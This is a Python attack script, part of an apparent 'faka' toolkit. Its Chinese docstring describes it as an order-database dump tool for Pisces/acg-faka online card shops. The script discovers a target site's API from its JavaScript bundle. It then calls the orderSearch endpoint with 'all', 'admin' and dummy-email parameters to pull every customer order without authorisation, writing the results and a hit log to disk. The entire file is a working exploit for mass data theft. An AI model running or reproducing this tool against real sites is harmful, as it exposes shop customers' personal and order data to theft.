#!/usr/bin/env python3
"""Pisces / acg-faka 订单拖库 — 并入 faka 工具包。

示例:
  python3 pisces_dump.py https://www.target.top
  python3 pisces_dump.py https://target.top -o /data/tools/faka/out/pisces_target
"""
from __future__ import annotations

import argparse
import json
import re
import ssl
import sys
import urllib.error
import urllib.request
from pathlib import Path
from urllib.parse import urljoin, urlparse

from faka_common import DEFAULT_UA, ensure_out, log, save_hit

SEARCH_TYPES = ("all", "admin", "1", "email")
CTX = ssl.create_default_context()


def fetch(url: str, timeout: int = 60) -> tuple[int, str]:
    req = urllib.request.Request(url, headers={"User-Agent": DEFAULT_UA})
    try:
        with urllib.request.urlopen(req, timeout=timeout, context=CTX) as r:
            return r.status, r.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")
    except Exception as e:
        return 0, str(e)


def discover_api_base(base: str) -> str:
    _, html = fetch(base.rstrip("/") + "/")
    m = re.search(r"assets/index\.[a-f0-9]+\.js", html)
    if m:
        _, js = fetch(urljoin(base.rstrip("/") + "/", m.group(0)))
        apis = re.findall(r'"(/api/v1/[^"]+)"', js)
        if apis:
            apis.sort(key=lambda x: (not x.endswith("/"), len(x)))
            return urljoin(base.rstrip("/") + "/", apis[0].rstrip("/"))
    return urljoin(base.rstrip("/") + "/", "api/v1/pisces")


def pull_orders(api_base: str) -> tuple[str, list]:
    for st in SEARCH_TYPES:
        if st == "email":
            url = f"{api_base}/orderSearch?search_type=email&email=a@b.com&password=x"
        else:
            url = f"{api_base}/orderSearch?search_type={st}"
        _, body = fetch(url)
        try:
            data = json.loads(body)
        except json.JSONDecodeError:
            continue
        if data.get("code") == 1 and isinstance(data.get("data"), list) and data["data"]:
            return st, data["data"]
    return "", []


def parse_args() -> argparse.Namespace:
    ap = argparse.ArgumentParser(description="Pisces 订单拖库")
    ap.add_argument("url")
    ap.add_argument("-o", "--out", default="")
    return ap.parse_args()


def main() -> int:
    args = parse_args()
    base = args.url.rstrip("/")
    domain = urlparse(base).netloc.replace("www.", "")
    out_dir = Path(args.out) if args.out else Path(f"/data/tools/faka/out/pisces_{domain}")
    out_dir.mkdir(parents=True, exist_ok=True)

    api_base = discover_api_base(base)
    log(f"target={base} api_base={api_base} out={out_dir}")

    hit_type, orders = pull_orders(api_base)
    if not orders:
        log("[!] 未拉到订单")
        save_hit(out_dir / "summary.jsonl", "pisces_fail", {"target": base, "api_base": api_base})
        return 2

    log(f"[+] search_type={hit_type} orders={len(orders)}")
    (out_dir / "orderSearch_all.json").write_text(json.dumps(orders, ensure_ascii=False, indent=2), encoding="utf-8")
    save_hit(Path("/data/tools/faka/out/pisces_hits.jsonl"), "pisces_dump", {
        "target": base, "search_type": hit_type, "count": len(orders), "out": str(out_dir),
    })
    return 0


if __name__ == "__main__":
    sys.exit(main())
